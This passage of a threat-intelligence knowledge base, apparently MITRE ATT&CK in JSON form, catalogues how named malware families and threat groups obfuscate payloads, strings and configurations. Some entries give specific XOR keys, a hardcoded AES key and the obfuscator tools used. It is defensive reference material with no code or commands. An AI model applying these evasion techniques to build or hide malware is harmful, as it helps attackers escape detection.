        "description": "FunnyDream can Base64 encode its C2 address stored in a template binary with the xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_- orxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_= character sets.[77]"
      },
      {
        "id": "S0410",
        "name": "Fysbis",
        "description": "Fysbis has been encrypted using XOR and RC4.[133]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.[134]"
      },
      {
        "id": "G0084",
        "name": "Gallmaker",
        "description": "Gallmaker obfuscated shellcode used during execution.[135]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has delivered self-extracting 7z archive files within malicious document attachments.[136]"
      },
      {
        "id": "S0168",
        "name": "Gazer",
        "description": "Gazer logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.[137]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium has the ability to compress its components.[78]"
      },
      {
        "id": "S0493",
        "name": "GoldenSpy",
        "description": "GoldenSpy's uninstaller has base64-encoded its variables. [138]"
      },
      {
        "id": "S0588",
        "name": "GoldMax",
        "description": "GoldMax has written AES-encrypted and Base64-encoded configuration files to disk.[139][140]"
      },
      {
        "id": "S0477",
        "name": "Goopy",
        "description": "Goopy's decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis.[29]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "The Grandoreiro payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.[39][141][141]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT supports file encryption (AES with the key \"lolomycin2017\").[142]"
      },
      {
        "id": "S0690",
        "name": "Green Lambert",
        "description": "Green Lambert has encrypted strings.[143][144]"
      },
      {
        "id": "S0342",
        "name": "GreyEnergy",
        "description": "GreyEnergy encrypts its configuration files with AES-256 and also encrypts its strings.[123]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.[145]"
      },
      {
        "id": "G0043",
        "name": "Group5",
        "description": "Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files.[146]"
      },
      {
        "id": "S0132",
        "name": "H1N1",
        "description": "H1N1 uses multiple techniques to obfuscate strings, including XOR.[147]"
      },
      {
        "id": "S0499",
        "name": "Hancitor",
        "description": "Hancitor has used Base64 to encode malicious links. Hancitor has also delivered compressed payloads in ZIP files to victims.[148][149]"
      },
      {
        "id": "S0391",
        "name": "HAWKBALL",
        "description": "HAWKBALL has encrypted the payload with an XOR-based algorithm.[150]"
      },
      {
        "id": "S0170",
        "name": "Helminth",
        "description": "The Helminth config file is encrypted with RC4.[151]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.[152][153][154]"
      },
      {
        "id": "S0698",
        "name": "HermeticWizard",
        "description": "HermeticWizard has the ability to encrypt PE files with a reverse XOR loop.[155]"
      },
      {
        "id": "S1027",
        "name": "Heyoka Backdoor",
        "description": "Heyoka Backdoor can encrypt its payload.[156]"
      },
      {
        "id": "S0087",
        "name": "Hi-Zor",
        "description": "Hi-Zor uses various XOR techniques to obfuscate its components.[157]"
      },
      {
        "id": "S0394",
        "name": "HiddenWasp",
        "description": "HiddenWasp encrypts its configuration and payload.[158]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa used Base64 encoded compressed payloads.[159][160]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has encrypted an ELF file.[161]"
      },
      {
        "id": "S0232",
        "name": "HOMEFRY",
        "description": "Some strings in HOMEFRY are obfuscated with XOR x56.[162]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has encrypted strings with single-byte XOR and base64 encoded RC4.[163]"
      },
      {
        "id": "S0070",
        "name": "HTTPBrowser",
        "description": "HTTPBrowser's code may be obfuscated through structured exception handling and return-oriented programming.[164]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq uses basic obfuscation in the form of spaghetti code.[113][165]"
      },
      {
        "id": "S0398",
        "name": "HyperBro",
        "description": "HyperBro can be delivered encrypted to a compromised host.[79]"
      },
      {
        "id": "S0483",
        "name": "IcedID",
        "description": "IcedID has utilzed encrypted binaries and base64 encoded strings.[166]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.[17]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.[167]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer uses heavily obfuscated code in its Windows Notepad backdoor.[7]"
      },
      {
        "id": "S0259",
        "name": "InnaputRAT",
        "description": "InnaputRAT uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.[168]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.[169][170]"
      },
      {
        "id": "S0581",
        "name": "IronNetInjector",
        "description": "IronNetInjector can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.[171]"
      },
      {
        "id": "S0189",
        "name": "ISMInjector",
        "description": "ISMInjector is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.[172]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "Many strings in JHUHUGIT are obfuscated with a XOR algorithm.[173][174][22]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "A JPIN uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.[175]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT’s Java payload is encrypted with AES.[176] Additionally, backdoor files are encrypted using DES as a stream cipher. Later variants of jRAT also incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool.[177]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar is obfuscated using the open source ConfuserEx protector. Kazuar also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.[178]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has used Base64-encoded shellcode strings.[179]"
      },
      {
        "id": "S0585",
        "name": "Kerrdown",
        "description": "Kerrdown can encrypt, encode, and compress multiple layers of shellcode.[180]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel's configuration is hardcoded and RC4 encrypted within the binary.[181]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin has Base64-encoded its configuration file.[182]"
      },
      {
        "id": "S0387",
        "name": "KeyBoy",
        "description": "In one version of KeyBoy, string obfuscation routines were used to hide many of the critical values referenced in the malware.[183]"
      },
      {
        "id": "S1051",
        "name": "KEYPLUG",
        "description": "KEYPLUG can use a hardcoded one-byte XOR encoded configuration file.[69]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY has used encrypted strings in its installer.[184]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk uses VMProtect to make reverse engineering the malware more difficult.[185]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has obfuscated binary strings including the use of XOR encryption and Base64 encoding.[186][187] Kimsuky has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format.[188]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos encrypts all strings using RC4 and bundles all functionality into a single function call.[189]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI is heavily obfuscated and includes encrypted configuration files.[190]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher.[191]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.[192][193][194][195][92][196][197]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has obfuscated code using base64 and gzip compression.[198]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron encrypts its configuration files with AES-256.[199]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has obfuscated strings with base64 encoding.[200]"
      },
      {
        "id": "S0451",
        "name": "LoudMiner",
        "description": "LoudMiner has encrypted DMG files.[201]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda has been obfuscated and contains encrypted functions.[202]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware has used base64-encoded files and has also encrypted embedded strings with AES.[203][204]"
      },
      {
        "id": "S0167",
        "name": "Matryoshka",
        "description": "Matryoshka obfuscates API function names using a substitute cipher combined with Base64 encoding.[205]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has decrypted strings and other important information during the encryption process. Maze also calls certain functions dynamically to hinder analysis.[206]"
      },
      {
        "id": "S0500",
        "name": "MCMD",
        "description": "MCMD can Base64 encode output strings prior to sending to C2.[207]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.[208][209][210]"
      },
      {
        "id": "G1013",
        "name": "Metador",
        "description": "Metador has encrypted their payloads.[202]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain's module file has been encrypted via XOR.[211]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has encrypted payloads and strings.[212][213]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia obfuscates the configuration with a custom Base64 and XOR.[214][215]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan can encode files containing information about the targeted system.[216][182]"
      },
      {
        "id": "S0051",
        "name": "MiniDuke",
        "description": "MiniDuke can use control flow flattening to obscure code.[121]"
      },
      {
        "id": "G0103",
        "name": "Mofang",
        "description": "Mofang has compressed the ShimRat executable within malicious email attachments. Mofang has also encrypted payloads before they are downloaded to victims.[217]"
      },
      {
        "id": "G0021",
        "name": "Molerats",
        "description": "Molerats has delivered compressed executables within ZIP files to victims.[218]"
      },
      {
        "id": "S0284",
        "name": "More_eggs",
        "description": "More_eggs's payload has been encrypted with a key that has the hostname and processor family information appended to the end.[219]"
      },
      {
        "id": "G1009",
        "name": "Moses Staff",
        "description": "Moses Staff has used obfuscated web shells in their operations.[100]"
      },
      {
        "id": "S0256",
        "name": "Mosquito",
        "description": "Mosquito’s installer is obfuscated with a custom crypter to obfuscate the installer.[220]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has delivered initial payloads hidden using archives and encoding measures.[221][222][223][224][225][226]"
      },
      {
        "id": "S0228",
        "name": "NanHaiShu",
        "description": "NanHaiShu encodes files in Base64.[227]"
      },
      {
        "id": "S0336",
        "name": "NanoCore",
        "description": "NanoCore’s plugins were obfuscated with Eazfuscater.NET 3.3.[228]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE has used a custom obfuscation algorithm to hide strings including Registry keys, APIs, and DLL names.[229]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used a DLL that included an XOR-encoded section.[230]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can obfuscate strings using the congruential generator (LCG): staten+1 = (690069 × staten + 1) mod 232.[231]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT has included a base64 encoded executable.[232]"
      },
      {
        "id": "S0353",
        "name": "NOKKI",
        "description": "NOKKI uses Base64 encoding for strings.[233]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has encrypted and encoded data in its malware, including by using base64.[234][235][236][237][238]"
      },
      {
        "id": "S0138",
        "name": "OLDBAIT",
        "description": "OLDBAIT obfuscates internal strings and unpacks them at startup.[89]"
      },
      {
        "id": "S0264",
        "name": "OopsIE",
        "description": "OopsIE uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2. OopsIE also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.[239][240]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64.[104][241][242][243]"
      },
      {
        "id": "C0016",
        "name": "Operation Dust Storm",
        "description": "During Operation Dust Storm, the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.[244]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors used Base64 to encode files with a custom key.[245]"
      },
      {
        "id": "C0005",
        "name": "Operation Spalax",
        "description": "For Operation Spalax, the threat actors used XOR-encrypted payloads.[246]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Some Orz strings are base64 encoded, such as the embedded DLL known as MockDll.[198]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "OSX_OCEANLOTUS.D encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.[247]"
      },
      {
        "id": "S0594",
        "name": "Out1",
        "description": "Out1 has the ability to encode data.[248]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell can use encryption and base64 encoding to hide strings and to enforce access control once deployed.[120]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora has the ability to compress stings with QuickLZ.[249]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare has been encrypted with XOR using different 32-long Base16 strings and compressed with LZW algorithm.[77]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin has encrypted strings in the binary for obfuscation.[250]"
      },
      {
        "id": "S0517",
        "name": "Pillowmint",
        "description": "Pillowmint has been compressed and stored within a registry key. Pillowmint has also obfuscated the AES key used for encryption.[251]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon modules are stored encrypted on disk.[252]"
      },
      {
        "id": "S0124",
        "name": "Pisloader",
        "description": "Pisloader obfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.[253]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX can use API hashing and modify the names of strings to evade detection.[79][226]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has used a custom encryption scheme for communication between scripts.[254]"
      },
      {
        "id": "S0012",
        "name": "PoisonIvy",
        "description": "PoisonIvy hides any strings related to its own indicators of compromise.[255]"
      },
      {
        "id": "S0518",
        "name": "PolyglotDuke",
        "description": "PolyglotDuke can custom encrypt strings.[121]"
      },
      {
        "id": "S0453",
        "name": "Pony",
        "description": "Pony attachments have been delivered via compressed archive files. Pony also obfuscates the memory flow by adding junk instructions when executing to make analysis more difficult.[256]"
      },
      {
        "id": "S0150",
        "name": "POSHSPY",
        "description": "POSHSPY appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.[257]"
      },
      {
        "id": "S0393",
        "name": "PowerStallion",
        "description": "PowerStallion uses a XOR cipher to encrypt command output written to its OneDrive C2 server.[258]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "Some resources in Prikormka are encrypted with a simple XOR operation or encoded with Base64.[259]"
      },
      {
        "id": "S0613",
        "name": "PS1",
        "description": "PS1 is distributed as a set of encrypted files and scripts.[260]"
      },
      {
        "id": "S0196",
        "name": "PUNCHBUGGY",
        "description": "PUNCHBUGGY has hashed most its code's functions and encrypted payloads with base64 and XOR.[261]"
      },
      {
        "id": "S0197",
        "name": "PUNCHTRACK",
        "description": "PUNCHTRACK is loaded and executed by a highly obfuscated launcher.[262]"
      },
      {
        "id": "G0024",
        "name": "Putter Panda",
        "description": "Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.[263]"
      },
      {
        "id": "S1032",
        "name": "PyDCrypt",
        "description": "PyDCrypt has been compiled and encrypted with PyInstaller, specifically using the --key flag during the build phase.[100]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot has hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.[264]"
      },
      {
        "id": "S0565",
        "name": "Raindrop",
        "description": "Raindrop encrypted its payload using a simple XOR algorithm with a single-byte key.[265][266]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay has downloaded as a XOR-encrypted payload.[267]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay has base64-encoded its portable executable and hidden itself under a JPG header. Ramsay can also embed information within document footers.[268]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can compress and obfuscate its strings to evade detection on a compromised host.[79]"
      },
      {
        "id": "S0172",
        "name": "Reaver",
        "description": "Reaver encrypts some of its files with XOR.[269]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "A RedLeaves configuration file is encrypted with a simple XOR key, 0x53.[270]"
      },
      {
        "id": "S0511",
        "name": "RegDuke",
        "description": "RegDuke can use control-flow flattening or the commercially available .NET Reactor for obfuscation.[121]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos uses RC4 and base64 to obfuscate data, including Registry entries and file paths.[271]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi obfuscates its configuration data with XOR.[272]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Some data in Remsec is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.[273][274]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil has used encrypted strings and configuration files.[275][276][277][278][279][280][281]"
      },
      {
        "id": "S0433",
        "name": "Rifdoor",
        "description": "Rifdoor has encrypted strings with a single byte XOR algorithm.[163]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Configuration data used by Rising Sun has been encrypted using an RC4 stream algorithm.[282]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has modified UPX headers after packing files to break unpackers.[283]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can encrypt data prior to exfiltration by using an RSA public key.[35][284]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm. RTM has also been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.[285][286]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk can use anti-disassembly and code transformation obfuscation techniques.[49]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot has been obfuscated to help avoid detection.[115]"
      },
      {
        "id": "S0074",
        "name": "Sakula",
        "description": "Sakula uses single-byte XOR obfuscation to obfuscate many of its files.[287]"
      },
      {
        "id": "S0370",
        "name": "SamSam",
        "description": "SamSam has been seen using AES or DES to encrypt payloads and payload components.[288][289]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used Base64 encoding within malware variants.[290]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic can use certain ConfuserEx features for obfuscation and can be encoded in a base64 string.[291]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to XOR the strings for its installer component with a hardcoded 128 byte key.[292]"
      },
      {
        "id": "S0345",
        "name": "Seasalt",
        "description": "Seasalt obfuscates configuration data.[293]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has encrypted its payload, a virtual file system, and various files.[294][108]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon contains base64-encoded strings.[295]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark can use encrypted and encoded files for C2 configuration.[216][296]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.[217]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter encrypted gathered information with a combination of shifting and XOR using a static key.[217]"
      },
      {
        "id": "S0063",
        "name": "SHOTPUT",
        "description": "SHOTPUT is obscured using XOR encoding and appended to a valid GIF file.[297][298]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used base64 encoding and ECDH-P256 encryption for payloads.[299][300][301]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape itself is obfuscated and uses obfuscated API calls.[302]"
      },
      {
        "id": "S0468",
        "name": "Skidmap",
        "description": "Skidmap has encrypted it's main payload using 3DES.[303]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver can encrypt strings at compile time.[304][305]"
      },
      {
        "id": "S1035",
        "name": "Small Sieve",
        "description": "Small Sieve has the ability to use a custom hex byte swapping encoding scheme combined with an obfuscated Base64 function to protect program strings and Telegram credentials.[306]"
      },
      {
        "id": "S0226",
        "name": "Smoke Loader",
        "description": "Smoke Loader uses a simple one-byte XOR method to obfuscate values in the malware.[307][308]"
      },
      {
        "id": "S1086",
        "name": "Snip3",
        "description": "Snip3 has the ability to obfuscate strings using XOR encryption.[309]"
      },
      {
        "id": "S0627",
        "name": "SodaMaster",
        "description": "SodaMaster can use \"stackstrings\" for obfuscation.[111]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can encrypt strings with XOR-based routines and use a custom AES storage format for plugins, configuration, C2 domains, and harvested data.[260][126][127]"
      },
      {
        "id": "S0516",
        "name": "SoreFang",
        "description": "SoreFang has the ability to encode and RC6 encrypt data sent to C2.[310]"
      },
      {
        "id": "S0374",
        "name": "SpeakUp",
        "description": "SpeakUp encodes its second-stage payload with Base64. [311]"
      },
      {
        "id": "S1030",
        "name": "Squirrelwaffle",
        "description": "Squirrelwaffle has been obfuscated with a XOR-based algorithm.[312][313]"
      },
      {
        "id": "S1037",
        "name": "STARWHALE",
        "description": "STARWHALE has been obfuscated with hex-encoded strings.[314]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has obfuscated its module with an alphabet-based table or XOR encryption.[315]"
      },
      {
        "id": "S0142",
        "name": "StreamEx",
        "description": "StreamEx obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.[316]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity has used encrypted strings in its dropper component.[317][318]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet uses encrypted configuration blocks and writes encrypted files to disk.[319]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST strings were compressed and encoded in Base64.[320] SUNBURST also obfuscated collected system information using a FNV-1a + XOR algorithm.[321]"
      },
      {
        "id": "S0562",
        "name": "SUNSPOT",
        "description": "SUNSPOT encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for SUNBURST source code and data extracted from the SolarWinds Orion <MsBuild.exe process.[322]"
      },
      {
        "id": "S0578",
        "name": "SUPERNOVA",
        "description": "SUPERNOVA contained Base64-encoded strings.[323]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can encrypt victim data with an RC4 cipher.[324]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.[325][326]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can encrypt and encode its configuration file.[249]"
      },
      {
        "id": "G1018",
        "name": "TA2541",
        "description": "TA2541 has used compressed and char-encoded scripts in operations.[327]"
      },
      {
        "id": "G0092",
        "name": "TA505",
        "description": "TA505 has password-protected malicious Word documents.[328]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor can use encrypted string blocks for obfuscation.[329]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has used an encrypted Virtual File System to store plugins.[330]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has encrypted its binaries via AES and encoded files using Base64.[331][332]"
      },
      {
        "id": "S0560",
        "name": "TEARDROP",
        "description": "TEARDROP created and read from a file with a fake JPG header, and its payload was encrypted with a simple rotating XOR cipher.[321][333][266]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.[334][335][336]"
      },
      {
        "id": "S0665",
        "name": "ThreatNeedle",
        "description": "ThreatNeedle has been compressed and obfuscated using RC4, AES, or XOR.[337]"
      },
      {
        "id": "S0131",
        "name": "TINYTYPHON",
        "description": "TINYTYPHON has used XOR with 0x90 to obfuscate its configuration file.[338]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma has been Base64 encoded and AES encrypted.[243]"
      },
      {
        "id": "G0134",
        "name": "Transparent Tribe",
        "description": "Transparent Tribe has dropped encoded executables on compromised hosts.[339]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.[340]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can base64 encode and AES-128-CBC encrypt data prior to transmission.[341]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has encrypted configuration files.[342][343]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian can use VMProtect for obfuscation.[45]"
      },
      {
        "id": "S0263",
        "name": "TYPEFRAME",
        "description": "APIs and strings in some TYPEFRAME variants are RC4 encrypted. Another variant is encoded with XOR.[344]"
      },
      {
        "id": "S0333",
        "name": "UBoatRAT",
        "description": "UBoatRAT encrypts instructions in the payload using a simple XOR cipher.[345]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can use AES and CAST-128 encryption to obfuscate resources.[346]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used an XOR-based algorithm to encrypt Tor clients dropped to disk.[347] Ursnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands.[348]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "Most strings in USBStealer are encrypted using 3DES and XOR and reversed.[349]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak has the ability to base64 encode and XOR encrypt strings.[350][351][352]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN is obfuscated using the obfuscation tool called ConfuserEx.[353]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "A Volgmer variant is encoded using a simple XOR cipher.[354]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "The WastedLocker payload includes encrypted strings stored within the .bss section of the binary file.[355]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear has used RC4 encrypted shellcode and encrypted functions.[356]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate can Base64 encode strings, store downloaded files in reverse byte order,  and use the Eazfuscator tool to obfuscate its third stage.[357][358][359]"
      },
      {
        "id": "G0107",
        "name": "Whitefly",
        "description": "Whitefly has encrypted the payload used for C2.[360]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used string encoding with floating point calculations.[361]"
      },
      {
        "id": "S0466",
        "name": "WindTail",
        "description": "WindTail can be delivered as a compressed, encrypted, and encoded payload.[362]"
      },
      {
        "id": "S0430",
        "name": "Winnti for Linux",
        "description": "Winnti for Linux can encode its configuration file with single-byte XOR encoding.[363]"
      },
      {
        "id": "S0141",
        "name": "Winnti for Windows",
        "description": "Winnti for Windows has the ability to encrypt and compress its payload.[364]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT has used Base64 encoded strings and scripts.[365]"
      },
      {
        "id": "S0117",
        "name": "XTunnel",
        "description": "A version of XTunnel introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.[366]"
      },
      {
        "id": "S0388",
        "name": "YAHOYAH",
        "description": "YAHOYAH encrypts its configuration file using a simple algorithm.[367]"
      },
      {
        "id": "S0230",
        "name": "ZeroT",
        "description": "ZeroT has encrypted its payload with RC4.[368]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda encrypts strings with XOR. Zeus Panda also encrypts all configuration and settings in AES and RC4.[369][370]"
      },
      {
        "id": "S0672",
        "name": "Zox",
        "description": "Zox has been encoded with Base64.[371]"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ has been encoded to avoid detection from static analysis tools.[372]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
